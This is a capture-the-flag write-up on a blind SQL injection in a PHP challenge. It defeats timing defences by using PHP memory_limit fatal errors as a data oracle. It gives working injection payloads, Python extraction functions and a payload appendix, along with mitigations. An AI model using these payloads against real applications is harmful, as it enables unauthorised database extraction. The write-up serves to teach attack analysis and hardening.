**NO TIMING ATTACK!! Blind SQLi via PHP **memory_limit ** Fatal Oracle**  
***CTF writeup // WEB // blind SQL injection***  
 *  
 Author: * ***0xnhsec*** * · September 2026*  
 *  
 Target: * *chall.ctf.ae* * (PHP 8 + mysqli, rotating instance, ~20 min TTL)*  
 *  
 Final flag: * ***pwnsec{9f5b1c7f391035d1}***  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OMQ2AABAAsSPBCUbfEm6YmFDBhAU2QtIq6DIzW7UHAMBfnGt1V8fXEwAAXrse/w8F7pbTa1oAAAAASUVORK5CYII=)  
**00 · TL;DR**  
| | |  
|-|-|  
|   |   |   
| **Challenge** | One PHP file, raw SQL injection in ?id=, output is a constant joke string |   
| **Defense** | (1) PHP shutdown function pads every response to exactly **2.0 s**; (2) a  **statement killer at the DB layer** aborts any query running longer than ~2.0 s |   
| **Result** | All timing oracles dead: SLEEP(), BENCHMARK(), FOR UPDATE, FOR SHARE, LOCK IN SHARE MODE, INTO @a everything flatlines at ~2.2 s |   
| **Bypass** | Stop using time. Stream a giant result set into PHP with UNION ALL until **memory_limit** ** (64 MB) fatals** the fatal happens *before* the final echo, so the **response body length changes** (4557 → ~167 bytes) |   
| **Upgrade** | display_errors=on leaks tried to allocate X bytes where **X = attacker-controlled row size** → encode a byte value into REPEAT('A', value * 400000) →  **one request = one full character** |   
| **Flag** | pwnsec{9f5b1c7f391035d1} (verified with a full-string equality oracle) |   
   
The core lesson: the challenge normalizes *server-side time*, but forgets that a blind  
   
 oracle only needs **any observable difference** and a PHP fatal error is a very loud one.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OMQ2AABAAsSNhYMMAKlD4OzrxgQU2QtIq6DIzR3UFAMBf3Gu1VefXEwAAXtsfSqADWz4G/HUAAAAASUVORK5CYII=)  
**01 · Challenge Overview**  
The application exposes a single endpoint that renders its own highlighted source on every  
   
 request (highlight_file(__FILE__, true)), so you always know exactly what code is deployed.  
   
 With ?id= set, it builds a query by raw string concatenation and runs it. Whatever happens  
   
 next, the response body does not change: success and failure both print the same  
   
 ill try to tell him, dw.  
Environment facts observed during recon:  
| | |  
|-|-|  
| **Property** | **Value observed** |   
| Endpoint | GET https://<instance>.chal.ctf.ae/?id=... |   
| Stack | PHP 8 (php-fpm) + mysqli → DB on 127.0.0.1 |   
| DB account | user @ chall low privilege, no stacked queries, no FILE |   
| Output | Constant body **4,557 bytes** with id,  **4,534 bytes** without |   
| Instance TTL | ~20 minutes, then the old subdomain returns **404** |   
| Backend DB | MySQL-compatible (MariaDB/MySQL 8 family), information_schema readable |   
   
Two tables mattered: users (feeds the visible query) and flag (the objective).  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OMQ2AABAAsSNBCkJfFSqwwIgHRiywEZJWQZeZ2ao9AAD+4lyruzq+ngAA8Nr1AOH8BeZxN/IIAAAAAElFTkSuQmCC)  
**02 · Source Code Analysis**  
The whole challenge is one file. Read as a whole it is an exercise in *closing channels*:  
   
 data output, error output, and timing are the three ways a blind injection can leak, and the  
   
 author addressed each one. Understanding exactly why each closure works and where its  
   
 assumption silently breaks is the key to the solve.  
**2.1 The injection point, and a deliberately silent output**  
$sql = "SELECT username FROM users WHERE id = " . $_GET["id"];  
 $res = $db->query($sql);  
 if (!$res) {  
     die("ill try to tell him, dw");  
 }  
 $row = $res->fetch_row();  
 echo 'ill try to tell him, dw';  
   
Textbook concatenation anything after WHERE id = is attacker-written SQL. But the code  
   
 under it is information-free *by design*: the die() branch and the success branch emit  
   
 **byte-identical** bodies. There is no boolean split, no error page, no HTML comment, not  
   
 even a difference in length. $row is fetched and then thrown away, so result data never  
   
 reaches the response.  
Errors are silenced at the driver level: mysqli_report(MYSQLI_REPORT_OFF) stops mysqli  
   
 from throwing exceptions or emitting warnings on failed statements. A malformed payload  
   
 produces no diagnostic the code just takes the die() path. Note the subtle asymmetry  
   
 that becomes important later: this silences *SQL* errors, but it does nothing about a  *PHP*  
 *  
 fatal error* raised outside the driver, e.g. one caused by mysqlnd buffering a result set  
   
 that is too large.  
**2.2 The 2.0-second pad**  
$START = microtime(true);  
 ob_start();  
 register_shutdown_function(function () use ($START) {  
     $remaining = 2.0 - (microtime(true) - $START);  
     if ($remaining > 0) {  
         usleep((int)($remaining * 1000000));  
     }  
 }); // no timing attack!!  
   
A shutdown function measures the request duration and, if the script finished early, sleeps  
   
 for the remainder total response time pinned at **2.0 seconds**. Any sub-2-second timing  
   
 oracle (IF(cond, SLEEP(1), 0), small BENCHMARK() burns, even plain boolean latency  
   
 noise) is erased before the bytes leave the server.  
Critically, the mechanism is **one-directional: it can only add time, never truncate it**.  
   
 A request that genuinely takes longer than 2.0 s would still be visibly slower. That  
   
 asymmetry is exactly what stage one of testing probes and exactly what the second,  
   
 invisible defense layer closes.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAM0lEQVR4nO3OUQmAQBBAwSdcjsu6HYxoDsEK/okwk2COmdnVGQAAf3GtalX76wkAAK/dDxFWBDkFf6+SAAAAAElFTkSuQmCC)  
**03 · Dead Ends Killing the Timing Channel**  
The obvious plan: the pad only pads *up*, so a boolean oracle  
   
 0 UNION SELECT IF(cond, SLEEP(6), 0) should separate into ~2 s vs ~6 s. Against the live  
   
 instance **nothing separated**. Every duration payload came back dead-flat at  **~2.2 s**,  
   
 meaning something behind PHP kills statements that cross the 2.0-second mark: the query  
   
 dies, query() returns false, the die() branch fires, and the pad absorbs the rest.  
| | | | |  
|-|-|-|-|  
| **Payload family** | **Expected** | **Observed** | **Verdict** |   
| SLEEP(1) | ~2.0 s (padded) | 2.21 s | no info clamped by pad |   
| SLEEP(3) … SLEEP(18) | 3–18 s | **2.21 s** | ❌ killed by statement timeout |   
| BENCHMARK(2e8, MD5('a')) | ~6–10 s | 2.22 s | ❌ killed by statement timeout |   
| IF(cond, SLEEP(6), 0) | 2 s vs 6 s | 2.21 s | ❌ oracle dead |   
| … FOR UPDATE | documented max_execution_time exemption for non-read-only SELECTs | 2.21 s | ❌ exemption not honored |   
| … FOR SHARE / LOCK IN SHARE MODE | legacy locking bypass | 2.22 s | ❌ same |   
| … INTO @a | variable-write exemption | 2.22 s | ❌ same |   
   
The locking-clause attempts are the interesting dead end: appending FOR UPDATE after the  
   
 injected expression is syntactically valid (the injection sits at the tail of the WHERE  
   
 clause), and MySQL documents that max_execution_time only applies to read-only SELECTs.  
   
 The backend is either MariaDB's max_statement_time which does not honor that exemption  
   
 the same way or a proxy-side killer. Either way the attacker-visible conclusion is  
   
 identical:  
***Server-side wall-clock time is a closed channel. Pad + statement killer = flat 2.2 s***  
 ***  
 for anything.***  
Two more recon facts shaped the final exploit:  
1. Plain UNION with huge rows also flatlined MySQL materializes union results into a  
 **server-side temp table** for de-duplication, which is slow enough to trip the killer  
   
 before a byte reaches PHP. **UNION ALL** streams rows to the client instead. That one  
   
 keyword is the difference between "no channel" and "total compromise".  
2. The instance rotated subdomain every ~20 minutes (old host → HTTP 404), so the final  
   
 pipeline had to be **parallel and resumable** across URL changes.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OMQ2AABAAsSNhZscYahheJwqQgQU2QtIq6DIze3UGAMBf3Gu1VcfXEwAAXrseoqcEQXyAWBgAAAAASUVORK5CYII=)  
**04 · The Memory Oracle**  
If time is closed, find another observable. The one that worked lives entirely on the  
   
 **client side**:  
1. $db->query() uses buffered mode **mysqlnd reads the *****entire***** result set into PHP**  
 **  
 memory** before fetch_row() is ever called.  
2. Build a result set bigger than the PHP memory_limit (**64 MB**, read straight off the  
   
 fatal message). The fatal fires *inside*query() **before** the final  
 echo 'ill try to tell him, dw' ever runs.  
3. A PHP fatal still runs shutdown functions, so the response is still padded to 2.0 s —  
   
 but the body is missing the final line: **4,557 bytes → ~167 bytes**. That length delta  
   
 is the oracle bit.  
The payload skeleton:  
0 UNION ALL  
 SELECT REPEAT('A', <value> * 400000)  
 FROM (SELECT 1 FROM information_schema.tables a,  
                  information_schema.tables b LIMIT 800) z  
   
- **UNION ALL** no temp table, rows stream directly to the client.  
- **Cartesian ** **information_schema.tables a, b LIMIT 800** a portable row generator (800  
   
 rows) that works on any install with a readable information_schema.  
- **REPEAT('A', n)** each row is n bytes wide; keep rows below max_allowed_packet  
   
 so the *server* never rejects the packet. 800 × 400 KB = 320 MB total ≫ 64 MB limit.  
And because display_errors is **on**, the fatal body says *exactly* which allocation  
   
 killed it captured verbatim from the live instance:  
v=1  (400 KB/row)  → tried to allocate 401408 bytes  
 v=5  (2 MB/row)    → tried to allocate 2002944 bytes  
 v=25 (10 MB/row)   → tried to allocate 10000032 bytes  
 IF true  v=10      → tried to allocate 4000032 bytes  
 IF false (control) → normal 4557-byte body, no fatal  
   
X ≈ value × 400,000 (+ a few KB of driver overhead). So:  
value = round(tried_to_allocate / 400000)  
   
**One request carries one full byte of secret data** not one bit. With the boolean  
   
 variant (IF(cond, 400000, 1)) the same primitive degrades into a classic  
   
 true/false oracle for binary-search fallbacks, cross-checks and verification.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OQQmAABRAsSdYxZ4/mJjEsxE8W8GbCFuCLTOzVXsAAPzFuVZ3dXw9AQDgtesBxPEF3bv7x0IAAAAASUVORK5CYII=)  
**05 · Exploitation Pipeline**  
The oracle primitives (Python, requests, one session per thread):  
U = 400000   # row size unit per value step  
 MANY = "(SELECT 1 FROM information_schema.tables a, \  
               information_schema.tables b LIMIT 800)"  
   
 def raw_alloc(expr):  
     payload = ("0 UNION ALL SELECT REPEAT('A', ((%s) * %d)) FROM %s z"  
                % (expr, U, MANY))  
     r = sess.get(BASE, params={"id": payload, "_cb": rand()})  
     m = re.search(r"tried to allocate (\d+)", r.text)  
     if len(r.text) >= 4550 or not m:  
         return None            # SQL error / NULL / packet error  
     return round(int(m.group(1)) / U)  
   
 def read_char(expr, i):  
     sub = "ASCII(SUBSTR((%s), %d, 1))" % (expr, i)  
     v = read_value(sub)                     # 1 request: full byte  
     if v is None:                           # fallback: hi/lo nibble  
         hi = read_value("(%s DIV 16)" % sub)  
         lo = read_value("(%s MOD 16)" % sub)  
         v = (hi << 4) | lo  
     return v  
   
Design choices that made it practical:  
- **Length first, without giant rows.** Length is read as three decimal digits —  
 LENGTH DIV 100, (LENGTH DIV 10) MOD 10, LENGTH MOD 10 so the widest row is only  
   
 4.4 MB, safely under any max_allowed_packet.  
- **Auto-degrade per character.** Try full-byte mode (rows up to 50.4 MB for ASCII 126);  
   
 if the packet limit rejects it, fall back to two nibble requests (rows ≤ 6 MB); if that  
   
 fails, degrade to a boolean binary search (1 bit/request). Every character is validated  
   
 as printable, and unreadable ones are retried.  
- **Parallel across characters.** Characters are independent a 4–5 worker  
 ThreadPoolExecutor extracts the whole string in waves while each request still takes a  
   
 constant ~2.2 s.  
- **Resumable state.** Every recovered character lands in a JSON state file keyed by the  
   
 query expression, so when the instance 404s mid-extraction, the new URL simply continues  
   
 where the old one died.  
Throughput: enumeration strings (GROUP_CONCAT of schemas/tables/columns) and the flag  
   
 itself all fell at **~1 request per character**, whole runs measured in minutes with  
   
 windows of 20 minutes per instance.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OMQ2AABAAsSPBCUZfE2IYmVDBhAU2QtIq6DIzW7UHAMBfnGt1V8fXEwAAXrse/xcF7U7sx4wAAAAASUVORK5CYII=)  
**06 · Results & Verification**  
Extraction log against the live instance:  
[+] schemata  -> information_schema, performance_schema, chall  
 [+] tables    -> flag, users  
 [+] columns   -> flag(flag)   |   users(id, username)  
 [+] users.id  -> 1,2  
 [~] flag.flag -> '?wnsec{9f5b1c7f391?35d1}'   (2 transient unreadable chars)  
   
The two ? positions were transient read failures (instance hiccups, not logic errors).  
   
 A targeted re-read with the multi-mode primitive resolved them:  
pos 1  -> 112 ('p')  
 pos 19 -> 48  ('0')  
   
Full-string verification a single boolean oracle request asking the database itself  
   
 whether the recovered string is exact:  
0 UNION ALL SELECT REPEAT('A', IF(((SELECT flag FROM flag) = 'pwnsec{9f5b1c7f391035d1}'),  
                                 400000, 1)) FROM (...800 rows...) z  
   
Response: **fatal → MATCH.**  
$ ./solve.py --verify  
 [+] equality check ... MATCH  
 [+] FLAG: pwnsec{9f5b1c7f391035d1}  
   
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANklEQVR4nO3OQQmAABRAsSfYxZo/jVEMYQLPJrCCNxG2BFtmZquOAAD4i3Ot7mr/egIAwGvXA4rLBc059ysnAAAAAElFTkSuQmCC)  
**07 · Why the Defense Failed**  
The two defense layers are actually well-chosen against the threat model they imagine:  
- The **2.0 s pad** is a clean, correct normalizer for *sub-2-second* timing signals.  
- The **statement killer** closes the one-directional hole the pad leaves open. Together  
   
 they make server-side execution time a genuinely constant observable. Most blind SQLi  
   
 writeups end right here.  
The blind spot is the assumption that query() returning normally means "nothing was  
   
 observable". Buffering mode means the *client* does heavy, attacker-sized work after the  
   
 server finishes and the size of that work is a function of query *data*, not query  
   
 *time*. Three concrete configuration mistakes turn that work into a data channel:  
1. memory_limit finite (64 MB) → the client can be pushed over the edge *deterministically*.  
2. display_errors=on → the crash itself is descriptive, leaking the exact allocation  
   
 size turning a 1-bit oracle into a multi-bit one for free.  
3. Fatal-aborted control flow changes the response body → the 1-bit channel exists even  
   
 with display_errors=off.  
Notably, the author *almost* had it right: MYSQLI_REPORT_OFF silences SQL errors, and  
   
 the constant-output design kills every data path but a fatal raised in the driver's  
   
 memory allocator is neither a SQL error nor output data, so it sails through both defenses.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANUlEQVR4nO3OQQmAABRAsSd4NIGBzPXBmAawhhW8ibAl2DIze3UGAMBf3Gu1VcfXEwAAXrsehaQEN+8fLHEAAAAASUVORK5CYII=)  
**08 · Mitigations**  
For anyone shipping this pattern (or hardening a real app):  
- **Prepared statements.** The root cause is string concatenation. Everything in this  
   
 writeup becomes unreachable the moment id is bound as an integer parameter.  
- **display_errors=Off** in production. It would not remove the oracle (body-length  
   
 still flips 4557 → ~4500), but it removes the free multi-bit upgrade and stops leaking  
   
 configuration values like the exact memory_limit.  
- **Cap result sizes at the application layer.**SELECT ... LIMIT, column whitelisting,  
   
 or reading with unbuffered queries (MYSQLI_STORE_RESULT_COPY_DATA off / use_result())  
   
 so a giant result set never accumulates in one request's memory.  
- **Raise ** **memory_limit** ** sanity vs ** **max_allowed_packet** **.** If the largest row the DB can  
   
 send is smaller than the PHP memory headroom, the fatal becomes unreachable; as-is, a  
   
 16–64 MB packet vs a 64 MB limit sits in the worst possible ratio.  
- **Keep the statement killer, but don't rely on it** it is a timing defense, and this  
   
 attack is not a timing attack. Its real value was forcing the attacker onto a noisier,  
   
 more request-hungry channel.  
- **Least privilege.** The user account could read information_schema across the  
   
 server. Schema-level GRANTs would have at least slowed enumeration.  
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAANElEQVR4nO3OQQmAABRAsad4EjtY9fewnUms4E2ELcGWmTmrKwAA/uLeqrU6vp4AAPDa/gDzWAM6QQXRdAAAAABJRU5ErkJggg==)  
**Appendix A · Payload Reference**  
-- connectivity / source          (no payload needed, page self-highlights)  
 -- boolean oracle (TRUE = fatal)  
 0 UNION ALL SELECT REPEAT('A', IF((<cond>), 400000, 1))  
   FROM (SELECT 1 FROM information_schema.tables a,  
                    information_schema.tables b LIMIT 800) z  
   
 -- byte-value oracle (value = round(tried_to_allocate / 400000))  
 0 UNION ALL SELECT REPEAT('A', ((<numeric-expr>) * 400000))  
   FROM (SELECT 1 FROM information_schema.tables a,  
                    information_schema.tables b LIMIT 800) z  
   
 -- enumeration expressions fed to the oracle  
 (SELECT GROUP_CONCAT(SCHEMA_NAME) FROM information_schema.schemata)  
 (SELECT GROUP_CONCAT(TABLE_NAME)  FROM information_schema.tables WHERE TABLE_SCHEMA=DATABASE())  
 (SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns  
   WHERE TABLE_NAME='<t>' AND TABLE_SCHEMA=DATABASE())  
 (SELECT GROUP_CONCAT(flag) FROM flag)  
   
 -- length, 3 requests, max row 4.4 MB  
 ((LENGTH(<expr>) DIV 100) MOD 10)   ((LENGTH(<expr>) DIV 10) MOD 10)   (LENGTH(<expr>) MOD 10)  
   
 -- character, 1 request  
 ASCII(SUBSTR((<expr>), <pos>, 1))  
   
**Appendix B · Session Timeline**  
| | | |  
|-|-|-|  
| **Stage** | **Action** | **Outcome** |   
| Recon | Fetched page, read self-highlighted source | Confirmed deployed code == sample.php |   
| Probe | SLEEP(3/6/10/18), BENCHMARK, IF() | Flat 2.21 s → statement killer discovered |   
| Bypass attempt | FOR UPDATE, FOR SHARE, LOCK IN SHARE MODE, INTO @a | All flat → timing channel declared dead |   
| Probe | Plain UNION + 160 MB rows | Flat (temp-table materialization) |   
| Breakthrough | UNION ALL + 800×200 KB | Body 4557 → 167 → **oracle found** |   
| Calibration | REPEAT sizes 1/5/10/25 × 400 KB | tried to allocate encodes value linearly |   
| Extraction | Parallel byte-oracle, 4–5 workers | schemas → tables → columns → flag |   
| Repair | Multi-mode re-read of 2 failed positions | ? → p, ? → 0 |   
| Verification | Full-string equality oracle | **MATCH ** **pwnsec{9f5b1c7f391035d1}** |   
   
![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAnEAAAACCAYAAAA3pIp+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAM0lEQVR4nO3OUQmAABBAsaeI2MKqV8RyJrGCfyJsCbbMzFldAQDwF/dWrdXx9QQAgNf2B/NkAzRb7P0YAAAAAElFTkSuQmCC)  
*Written by * ***0xnhsec*** * · September 2026*  
   
 *Tooling: Python + * *requests* * · resumable JSON extraction state · one request per character*  
